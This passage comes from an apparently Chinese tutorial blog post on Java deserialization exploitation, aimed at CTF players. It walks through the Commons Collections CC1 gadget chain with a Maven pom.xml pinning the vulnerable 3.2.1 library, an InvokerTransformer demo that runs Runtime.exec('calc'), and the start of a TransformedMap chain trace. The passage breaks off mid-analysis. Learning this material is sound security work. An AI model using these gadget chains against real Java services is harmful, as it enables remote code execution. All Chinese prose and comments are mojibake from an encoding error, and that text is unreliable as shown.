class="line">JVMæ¢å¤å½“å‰å¯¹è±¡çš„åŸºç¡€å­—æ®µ</span><br><span class="line">    â†“</span><br><span class="line">ç»§ç»­æ‰§è¡Œä½ çš„è‡ªå®šä¹‰é€»è¾‘</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>ç„¶åæˆ‘ä»¬JAVAååºåˆ—åŒ–åˆ©ç”¨çš„å°±æ˜¯ç±»å¯¹<code>readObject</code>è¿™ä¸ªæ–¹æ³•çš„é‡å†™ï¼Œç„¶åé¡ºç€åˆ©ç”¨é“¾ä¸€ç›´å¾€åé¢æ‰¾ç„¶åæ‰¾åˆ°ååºåˆ—åŒ–å¯ä»¥åˆ©ç”¨çš„ã€‚è¿™ä¸ªçœ‹ç€å°±å¥½éš¾ï¼Œæˆ‘ä¹Ÿå°±åªèƒ½é€šè¿‡å·¥å…·åŠåˆ©ç”¨ä¸€ä¸‹äº†å§</p>
<h2 id="3-CC1é“¾"><a href="#3-CC1é“¾" class="headerlink" title="3.CC1é“¾"></a>3.CC1é“¾</h2><p>æˆ‘ä»¬åœ¨æ‰¾é“¾å­ä¹‹å‰éœ€è¦å‡†å¤‡å¥½ç¯å¢ƒå’Œæºç ï¼Œç½‘ä¸Šæœ‰å¾ˆå¤šæ–¹æ³•è¿›è¡Œæºç å®¡è®¡ï¼Œæˆ‘æ„Ÿè§‰ç›´æ¥é€šè¿‡Mavenå’ŒIDEAä¸‹è½½æºç ä¸‹æ¥æ˜¯æœ€æ–¹ä¾¿çš„</p>
<p>é¦–å…ˆéšä¾¿åˆ›å»ºä¸€ä¸ªMavené¡¹ç›®ï¼Œç„¶åé…ç½®pom.xml</p>
<div class="code-container" code-lang="Xml"><div class="codebox"><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>CC<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.build.sourceEncoding</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-beanutils<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-beanutils<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.9.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.javassist<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javassist<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.28.0-GA<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">repositories</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">repository</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span>&gt;</span>aliyun<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">name</span>&gt;</span>Aliyun Maven<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">url</span>&gt;</span>https://maven.aliyun.com/repository/public<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">repository</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">repositories</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>ä½¿ç”¨Aliyunçš„é•œåƒæ˜¯å› ä¸ºæˆ‘SSLè¯ä¹¦æœ‰é—®é¢˜ï¼Œåªèƒ½ç”¨é•œåƒäº†</p>
<p>ç„¶åå°±æ˜¯åœ¨Mavenä¸­ä¸‹è½½æºç ä¸‹æ¥</p>
<img lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/2025/10/01/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251005150707228.png" class title="image-20251005150707228">

<p>ç›´æ¥å³é”®ç„¶åä¸‹è½½æºç å’Œæ–‡æ¡£å³å¯</p>
<p>è™½ç„¶å¯ä»¥é€šè¿‡å·¥å…·ç›´æ¥ç”Ÿæˆå¯¹åº”çš„RCEé“¾ï¼Œä½†æ˜¯è¿˜æ˜¯è¦æ·±åº¦ç†è§£ä¸€ä¸‹Javaååºåˆ—åŒ–é“¾æ‰èƒ½ä½¿ç”¨å¥½å·¥å…·ï¼Œç„¶åæ ¹æ®é¢˜ç›®è¿›è¡Œä¸€ä¸‹å¾®è°ƒ</p>
<h3 id="1-è§¦å‘ç‚¹"><a href="#1-è§¦å‘ç‚¹" class="headerlink" title="1.è§¦å‘ç‚¹"></a>1.è§¦å‘ç‚¹</h3><p>CC1é“¾çš„å…¥å£å°±æ˜¯</p>
<div class="code-container" code-lang="Plaintext"><div class="codebox"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org.apache.commons.collections.functors  â€“Commons Collectionsè‡ªå®šä¹‰çš„ä¸€ç»„åŠŸèƒ½ç±» Transformer.class</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>ä»£ç å°±æ˜¯å®šä¹‰ä¸€ä¸ªæ¥å£ï¼Œæ¥æ”¶ä¸€ä¸ªå¯¹è±¡ç„¶åå“¦æ‰§è¡Œtransformï¼ˆæŠ½è±¡æ–¹æ³•ï¼Œç”±å®ç°æ¥å£çš„ç±»å»é‡å†™ï¼‰è¿”å›ä¸€ä¸ªå¯¹è±¡</p>
<div class="code-container" code-lang="Java"><div class="codebox"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache.commons.collections;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Transformer</span> &#123;</span><br><span class="line">    Object <span class="title function_">transform</span><span class="params">(Object var1)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>ç„¶åæˆ‘ä»¬è¿½è¸ªè¿™ä¸ªæ¥å£çš„å®ç°æ–¹æ³•åˆ°</p>
<img lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/2025/10/01/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251005154208772.png" class title="image-20251005154208772">

<p>è‡³äºä¸ºä»€ä¹ˆæ˜¯è¿™ä¸ªç±»ï¼Œæˆ‘è‡ªå·±ä¸çŸ¥é“ï¼Œåªèƒ½ç«™åœ¨å·¨äººçš„è‚©è†€ä¸Šçœ‹çœ‹å°±è¡Œäº†</p>
<p>å‘ç°é‡å†™çš„transformæ–¹æ³•</p>
<img lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/2025/10/01/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251005154422347.png" class title="image-20251005154422347">

<p>å…¶ä¸­ iMethodNameï¼ŒiParamTypesï¼ŒiArgsä¸‰ä¸ªå‚æ•°å¯ä»¥é€šè¿‡ ç±»InvokerTransformerå…¬æœ‰æ„é€ å‡½æ•°æ¥è¿›è¡Œæ§åˆ¶ï¼š</p>
<img lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/2025/10/01/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251005154710646.png" class title="image-20251005154710646">

<p>ç„¶åæˆ‘ä»¬å¯ä»¥å®ç°å‘½ä»¤æ‰§è¡Œçš„é‡ç‚¹åœ¨äº</p>
<div class="code-container" code-lang="Java"><div class="codebox"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass(); <span class="comment">//ç”¨äºè·å–inputçš„ç±»</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(iMethodName, iParamTypes); <span class="comment">//getMethod() æ ¹æ®æ–¹æ³•åå’Œå‚æ•°ç±»å‹è·å–ç±»çš„å…¬å…±æ–¹æ³•</span></span><br><span class="line"><span class="keyword">return</span> method.invoke(input, iArgs);  <span class="comment">//method.invoke() é€šè¿‡åå°„åŠ¨æ€è°ƒç”¨æ–¹æ³•</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p> äºæ˜¯è¿™ä¸ªä»£ç å°±é€šè¿‡è·å–ç±»ï¼Œç„¶åæ ¹æ®å‚æ•°å’Œæ–¹æ³•åè·å–å¯¹åº”çš„æ–¹æ³•ï¼Œç„¶åå†é€šè¿‡åå°„åŠ¨æ€è°ƒç”¨æ–¹æ³•ï¼Œè€Œä¸”å‚æ•°éƒ½æ˜¯ç”±æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„ï¼Œäºæ˜¯RCEå°±å˜å¾—ååˆ†ç®€å•</p>
<p>æˆ‘ä»¬éœ€è¦æ³¨æ„çš„æ˜¯ä¸¤ä¸ªåœ°æ–¹ï¼Œä¸€ä¸ªæ˜¯æˆ‘ä»¬å¯æ§çš„å®ä¾‹åŒ–å‚æ•°ï¼Œå¦å¤–ä¸€ä¸ªæ˜¯æˆ‘ä»¬è°ƒç”¨æ–¹æ³•æ—¶çš„å‚æ•°input</p>
<div class="code-container" code-lang="Java"><div class="codebox"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InvokeTransformerRCE</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line"><span class="comment">//ä»å·¦åˆ°å³ä¼ é€’çš„å‚æ•°åˆ†åˆ«ä½œä¸ºæ–¹æ³•å,å‚æ•°ç±»å‹,å‚æ•°</span></span><br><span class="line">        invokerTransformer.transform(r);</span><br><span class="line"><span class="comment">//ä¼ é€’input</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Class cls = input.getClass()  --&gt; Runtime.getRuntime().getClass() --&gt; clsè¡¨ç¤ºRuntimeç±»çš„ä¸€ä¸ªå¯¹è±¡</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//è·å–Runtimeç±»ä¸­çš„execæ–¹æ³•</span></span><br><span class="line"><span class="comment">// Method method = cls.getMethod(this.iMethodName, this.iParamTypes) --&gt; cls.getMethod(&quot;exec&quot;, new Class[]&#123;String.class&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//è¿›è¡Œå‘½ä»¤æ‰§è¡Œ</span></span><br><span class="line"><span class="comment">//exec.invoke(Runtime.getRuntime(), &quot;calc&quot;) --&gt; Runtime.getRuntime().exec(&quot;calc&quot;);</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>æˆåŠŸè¿›è¡ŒRCE</p>
<img lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/2025/10/01/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251005161956403.png" class title="image-20251005161956403">



<h3 id="2-åˆ©ç”¨é“¾"><a href="#2-åˆ©ç”¨é“¾" class="headerlink" title="2.åˆ©ç”¨é“¾"></a>2.åˆ©ç”¨é“¾</h3><p>è™½ç„¶æˆ‘ä»¬å·²ç»å¯ä»¥è§¦å‘RCEäº†ï¼Œä½†æ˜¯æˆ‘ä»¬è¿˜æ— æ³•ç›´æ¥åˆ©ç”¨ï¼Œé¢˜ç›®å¯ä¸ä¼šç›´æ¥è®©ä½ å†™ä»£ç æˆ–è€…å‡½æ•°æ‰§è¡Œï¼Œæˆ‘ä»¬éœ€è¦çš„æ˜¯é€šè¿‡ååºåˆ—åŒ–è§¦å‘RCE</p>
<p>æ¼æ´ç‚¹åœ¨transformæ–¹æ³•ï¼Œäºæ˜¯æˆ‘ä»¬è·Ÿè¿›transformæ–¹æ³•çœ‹çœ‹ï¼Œå‘ç°TransformedMap.java</p>
<img lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/2025/10/01/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251005163955522.png" class title="image-20251005163955522">

<p>æˆ‘ä»¬ç›´æ¥æ¥çœ‹é“¾å­ä¸­çš„checkSetValueæ–¹æ³•</p>
<div class="code-container" code-lang="Java"><div class="codebox"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Object <span class="title function_">checkSetValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> valueTransformer.transform(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>è¿™é‡Œè°ƒç”¨çš„æ˜¯valueTransformerçš„transformæ–¹æ³•ï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹æ˜¯å¦å¯æ§</p>
<p>æˆ‘ä»¬å¯çœ‹åˆ°åœ¨transformMapä¸­è¢«èµ‹å€¼</p>
<img lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/2025/10/01/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251005165142873.png" class title="image-20251005165142873">

<p>ä½†æ˜¯ TransformedMapæ–¹æ³•çš„å±æ€§ä¸º protectedï¼Œè¿™å¯¼è‡´è¯¥æ–¹æ³•åªæœ‰å†…éƒ¨ç±»å¯ä»¥è¿›è¡Œè®¿é—®è°ƒç”¨ï¼Œç»§ç»­å‘ä¸ŠæŸ¥æ‰¾ï¼Œå¯ä»¥çœ‹åˆ°åœ¨decorate()æ–¹æ³•ä¸­è°ƒç”¨äº†è¯¥æ–¹æ³•ï¼Œå¹¶ä¸”å±æ€§ä¸ºpublicï¼ŒvalueTransformerå€¼å¯æ§ï¼š</p>
<img lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/2025/10/01/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251005165243956.png" class title="image-20251005165243956">

<p>äºæ˜¯æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡decorateæ–¹æ³•è¿›è¡Œèµ‹å€¼ï¼Œç„¶åå°†valueTransformerå†™å…¥æˆ‘ä»¬çš„æ¼æ´è§¦å‘ç±»</p>
<p>å‚æ•°æ˜¯Mapï¼ˆå®é™…ä¸Šæ˜¯ä¸€ä¸ªé”®å€¼å¯¹æ¥å£ï¼‰ï¼Œå’ŒTransformerå¯¹è±¡çš„é”®å’Œå€¼ï¼Œä½†æˆ‘ä»¬åªéœ€è¦é€šè¿‡valueTransformerè¿›è¡Œå‡½æ•°è°ƒç”¨å³å¯</p>
<p>å› æ­¤æˆ‘ä»¬å¯ä»¥å¾—åˆ°ä¸€å°éƒ¨åˆ†é“¾å­</p>
<div class="code-container" code-lang="Java"><div class="codebox"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">decorate(map, <span class="literal">null</span>, invokeTransformer)æ–¹æ³• --&gt; TransformedMap()æ–¹æ³• --&gt; valueTransformer = invokeTransformer -&gt; checkSetValue()æ–¹æ³• --&gt; invokeTransformer.transform(value)</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>



<p>ç°åœ¨é—®é¢˜å°±æ˜¯æˆ‘ä»¬è¯¥å¦‚ä½•è§¦å‘checkSetValueæ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•çš„å±æ€§æ˜¯protectï¼Œè¿™ä¹Ÿä»£è¡¨ç€ checkSetValueåªèƒ½è¢«å†…éƒ¨ç±»è®¿é—®è°ƒç”¨ï¼Œè¿™å°±éœ€è¦æŸ¥æ‰¾ checkSetValue()æ–¹æ³•åœ¨å“ªäº›åœ°æ–¹è¢«è°ƒç”¨ï¼š</p>
<img lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/2025/10/01/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251005165715400.png" class title="image-20251005165715400">

